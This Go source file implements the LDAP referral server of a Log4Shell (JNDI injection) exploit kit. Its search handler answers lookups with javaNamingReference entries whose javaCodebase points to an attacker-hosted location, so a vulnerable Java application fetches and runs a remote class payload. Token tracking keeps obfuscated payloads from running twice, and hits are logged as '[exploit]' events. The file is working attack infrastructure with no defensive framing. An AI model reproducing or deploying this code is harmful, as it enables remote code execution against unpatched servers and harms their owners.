package log4shell

import (
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/For-ACGN/ldapserver"
	"github.com/lor00x/goldap/message"
)

// TokenExpireTime is used to prevent repeat execute payload.
const TokenExpireTime = 20 // second

type ldapHandler struct {
	logger *log.Logger

	payloadDir string
	codeBase   string

	// tokens set is used to prevent repeat
	// execute payload when use obfuscate.
	// key is token, value is timestamp
	tokens   map[string]int64
	tokensMu sync.Mutex
}

func (h *ldapHandler) handleBind(w ldapserver.ResponseWriter, _ *ldapserver.Message) {
	res := ldapserver.NewBindResponse(ldapserver.LDAPResultSuccess)
	w.Write(res)
}

func (h *ldapHandler) handleSearch(w ldapserver.ResponseWriter, m *ldapserver.Message) {
	addr := m.Client.Addr()
	req := m.GetSearchRequest()
	dn := string(req.BaseObject())

	// check class name has token
	if strings.Contains(dn, "$") {
		// parse token
		sections := strings.SplitN(dn, "$", 2)
		class := sections[0]
		if class == "" {
			h.logger.Printf("[warning] %s search invalid java class \"%s\"", addr, dn)
			h.sendErrorResult(w)
			return
		}
		// check token is already exists
		token := sections[1]
		if token == "" {
			h.logger.Printf("[warning] %s search java class with invalid token \"%s\"", addr, dn)
			h.sendErrorResult(w)
			return
		}
		if !h.checkToken(token) {
			h.sendErrorResult(w)
			return
		}
		dn = class
	}

	h.logger.Printf("[exploit] %s search java class \"%s\"", addr, dn)

	// check class file is exists
	fi, err := os.Stat(filepath.Join(h.payloadDir, dn+".class"))
	if err != nil {
		h.logger.Printf("[error] %s failed to search java class \"%s\": %s", addr, dn, err)
		h.sendErrorResult(w)
		return
	}
	if fi.IsDir() {
		h.logger.Printf("[error] %s searched java class \"%s\" is a directory", addr, dn)
		h.sendErrorResult(w)
		return
	}

	// send search result
	res := ldapserver.NewSearchResultEntry(dn)
	res.AddAttribute("objectClass", "javaNamingReference")
	res.AddAttribute("javaClassName", message.AttributeValue(dn))
	res.AddAttribute("javaFactory", message.AttributeValue(dn))
	res.AddAttribute("javaCodebase", message.AttributeValue(h.codeBase))
	w.Write(res)

	done := ldapserver.NewSearchResultDoneResponse(ldapserver.LDAPResultSuccess)
	w.Write(done)
}

func (h *ldapHandler) checkToken(token string) bool {
	h.tokensMu.Lock()
	defer h.tokensMu.Unlock()
	// clean token first
	now := time.Now().Unix()
	for key, timestamp := range h.tokens {
		delta := now - timestamp
		if delta > TokenExpireTime || delta < -TokenExpireTime {
			delete(h.tokens, key)
		}
	}
	// check token is already exists
	if _, ok := h.tokens[token]; ok {
		return false
	}
	h.tokens[token] = time.Now().Unix()
	return true
}

func (h *ldapHandler) sendErrorResult(w ldapserver.ResponseWriter) {
	done := ldapserver.NewSearchResultDoneResponse(ldapserver.LDAPResultNoSuchObject)
	w.Write(done)
}
